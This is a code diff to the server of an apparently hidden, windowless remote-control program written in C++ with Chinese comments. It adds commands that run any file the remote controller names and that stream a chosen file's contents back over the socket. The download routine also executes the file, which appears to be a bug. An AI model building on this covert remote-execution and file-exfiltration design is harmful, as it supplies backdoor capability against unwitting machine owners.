@@ -8,10 +8,14 @@
 #include <direct.h>
 #include <io.h>
 #include <list>
+#include <fstream>
+#include <string>
 
 #ifdef _DEBUG
 #define new DEBUG_NEW
 #endif
+
+#pragma warning(disable:4996)  // 对fopen不报错
 
 // 设置入口点为 mainCRTStartup, 子系统设置为 windows.则没有窗口,在后台运行
 
@@ -116,6 +120,59 @@ int MakeDirInfo()
     return 0;
 }
 
+
+/* 运行文件 */
+int RunFile()
+{
+    std::string path;
+    CServerSocket::getInstance()->GetFilePath(path);
+    ShellExecuteA(nullptr, nullptr, path.c_str(), nullptr, nullptr, SW_SHOWNORMAL);
+
+	CPacket pack(CMD_RUN, nullptr, 0);
+	CServerSocket::getInstance()->SendData(pack);
+
+    return 0;
+}
+
+/* 下载某个文件 */
+int DownloadFile()
+{
+	std::string path;
+	CServerSocket::getInstance()->GetFilePath(path);
+	ShellExecuteA(nullptr, nullptr, path.c_str(), nullptr, nullptr, SW_SHOWNORMAL);
+
+    long long dataLen = 0;
+    FILE* file = fopen(path.c_str(), "rb");
+    if (file == nullptr)
+    {
+        CPacket pack(CMD_DLFILE, (BYTE*)&dataLen, sizeof(dataLen));
+        CServerSocket::getInstance()->SendData(pack);
+        return -1;
+    }
+
+    // 向控制端先发送一个文件的大小
+    fseek(file, 0, SEEK_END);
+    dataLen = _ftelli64(file);
+    CPacket head(CMD_DLFILE, (BYTE*)&dataLen, sizeof(dataLen));
+    fseek(file, 0, SEEK_SET);
+
+
+    char buffer[1024];
+    size_t len = 0;
+    do 
+    {
+        len = fread(buffer, 1, 1024, file);
+        CPacket packet(CMD_DLFILE, (BYTE*)buffer, len);
+        CServerSocket::getInstance()->SendData(packet);
+    } while (len != 0);
+
+    CPacket packet(CMD_DLFILE, nullptr, 0);
+    CServerSocket::getInstance()->SendData(packet);
+    fclose(file);
+
+    return 0;
+}
+
 int main()
 {
     int nRetCode = 0;
@@ -166,7 +223,13 @@ int main()
 				break;
             case CMD_DIR:       // 获取指定目录的文件信息
                 MakeDirInfo();
-                break;      
+                break;     
+            case CMD_RUN:       // 运行某个文件
+                RunFile();
+                break;
+            case CMD_DLFILE:
+                DownloadFile();
+                break;
             }
 
         }
